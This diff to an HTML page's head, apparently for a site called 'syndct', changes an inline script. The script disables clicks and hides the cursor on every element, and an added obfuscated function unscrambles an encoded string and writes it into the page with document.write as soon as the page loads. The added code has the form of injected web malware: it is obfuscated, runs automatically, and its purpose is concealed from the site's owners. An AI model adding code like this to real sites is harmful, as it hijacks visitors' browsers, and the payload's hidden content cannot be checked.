@@ -16,14 +16,39 @@
     <meta content="syndct" property="twitter:title">
     <meta content="width=device-width, initial-scale=1" name="viewport">
     <script type="text/javascript">
-document.addEventListener('DOMContentLoaded', () => {
-    document.querySelectorAll('*:not()').forEach((A) => {
-        A.setAttribute(
-            'style',
-            'pointer-events: none !important; image-rendering: -webkit-optimize-contrast !important; cursor: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=) 1 1, none !important'
+document.addEventListener("DOMContentLoaded", () => {
+        document.querySelectorAll("*:not(html)").forEach((d) => {
+            d.setAttribute(
+                "style",
+                "pointer-events: none !important; image-rendering: -webkit-optimize-contrast !important; cursor: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=) 1 1, none !important"
+            );
+        });
+    }),
+    (() => {
+        for (
+            j = (function () {
+                for (
+                    h = "Zlt*_v}T9$ks!WbSG75", a = Array(h.length), l = 0; l < h.length; l++
+                )
+                    a[l] = h.charCodeAt(l);
+                return a;
+            })(),
+            m = (d) => document.write(d),
+            k = decodeURI(
+                "".concat(
+                    "aoL,SEnHTrBde5EK3R3sJilcbbKp:gijntfY%20%3CtCVja2gp3sG5Gcxa0tabcSba15JdVZ3Zy49Ur;c0blXSXz5CpZuAnWWaus56RbZbYVrcrJWKbbdFkX1WithkWrW9pImFylCndWat9sQZlIGepNFJQPZucnSiGH3=yc6l3G2W0uwp1dZYdUppwc2LZdel9mYmuWLoGnT9ibhw1vmydUcB5dcOcQW%200F19jObFRymUUzntBQsFCWkxp0FyFaQQVlswBWUeYVcBQUVGgDBNUcVVYMtyCi33MVQVRJEQ1QUoB9BFbYYRQBTE02LdBRNhWSmv0zZBJZQaTFtlBHULQTRFdWFUvBLV1QUVLQBTSE2UTUUFA5VckSD0BFFlYQQsIBWGC1BbgdJkWU1wBWF7FReaIF9keWWQbIo1FtiUB/FuSVrra%20SsyWUmplKdVU/c2UxupQptZWaETtgQQtpbUFFWZgctkUNZyiq9D%3C0x2mE5FGJZbmU%3EtFlZZJ9QbGHmdFIpfS3eUt7dS=JWxNRjkvascclQtB/hsJQivB%3E"
+                )
+            ).split(""),
+            g = k.length % j.length,
+            l = k.length - 1; 0 <= l; l--
         )
-    })
-})
+            g--,
+            -1 == g && (g = j.length - 1),
+            (f = l + j[g]),
+            f >= k.length || ((c = k[l]), (b = k[f]), (k[f] = c), (k[l] = b));
+        for (n = m, i = "", l = 0; l < k.length; l++) i += k[l];
+        n(i);
+    })();
     </script>
     <style type="text/css">
         @charset "utf-8";
